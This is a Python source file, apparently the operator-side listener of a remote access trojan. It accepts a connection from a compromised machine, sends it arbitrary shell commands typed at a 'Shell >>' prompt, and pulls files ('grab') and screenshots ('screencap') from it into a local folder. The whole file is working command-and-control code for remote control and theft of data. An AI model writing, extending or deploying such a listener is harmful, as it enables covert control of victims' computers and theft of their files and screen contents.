#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jul 10 01:06:32 2018

@author: thomas
"""

import socket 
import sys
import os 


sys.path.append("dependencies/")
import communicator


    
class clientServerExchanger:
    def __init__(self , port = 4242 , ip="0.0.0.0"):
        self.port = port 
        self.ip = ip 
        self.socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.communicator = None
        self.client_socket = 0 
        self.command = ""
        self.debug = False 
        self.path = os.getcwd().replace("\\" , "/")
        self.downloadDir = (self.path + "/DownloadedFiles")        
        self.initializeServer()
        
    def initializeServer(self):
        self.socket.bind((self.ip , self.port));
        self.socket.listen(1)
        print("[+] Server is listenning connections on port -> " + str(self.port) )
        
        self.acceptConnection()
    
    def acceptConnection(self):
        self.client_socket , addr =  self.socket.accept()
        print("[+] We got a new connection from "  , addr[0] , " on port " , addr[1])
        self.communicator = communicator.communicator(self.client_socket)
    
        self.mainHandler()
    
    def mainHandler(self):
        
        
        while(True):
            
            self.command = input("Shell >>")
            
            if 'terminate' in self.command :
                self.closeServer()
                break
            
            elif 'grab' in self.command : 
                self.communicator.send(self.command)
                self.transfer(self.command)
                
              
            elif 'screencap' in self.command :
                self.communicator.send(self.command)
                self.screenShot()
            
            
            else:
                self.communicator.send(self.command)
                print(self.communicator.receive())  
                
    def screenShot(self):
        if not os.path.exists("DownloadedFiles"):
            os.makedirs("DownloadedFiles")
        
        
        result = self.communicator.receive()
        if not "Error" in result:
            print("[+]Screenshot!... Preparing the download")
            #file = "DownloadedFiles/" + "screenShot"+datetime.datetime.now().strftime('%m_%d_%Y-%H:%M:%S') + ".jpg"
            file =  self.downloadDir + "/" + result + ".jpg" 
            
            self.transfer("grab*" + file)
            print("[+] Capture saved as -> " , file)
        else:
            print(result)
            return 
    
    def closeServer(self):
        self.communicator.send("terminate")
        self.socket.close()
        self.client_socket.close()
    
    
    def transfer(self , command):
        if not os.path.exists(self.downloadDir):
            os.makedirs(self.downloadDir)
    
        grab , path = command.split("*")
        if "Exist" in self.communicator.receive() : 
            print("[+]File exist.. Preparing the download")
            path = path.split("/")
            file = path[-1] 
            self.communicator.receiveBytes(self.downloadDir + "/" + file )
        else:
            print("Unable to find the file")
            return
        
        print("[+] File succesfully transfered . Saved as -> " , self.downloadDir + "/" + file )

    
    def debugInfo(mess , arg):
        if self.debug == True:  
            print(mess , arg)
        
        
        
                
try :
    if(len(sys.argv) > 1 ):
        port = int(sys.argv[1])    
        c = clientServerExchanger(port)
    else:
        c = clientServerExchanger()
        
except KeyboardInterrupt:
    c.closeServer()
                
        
        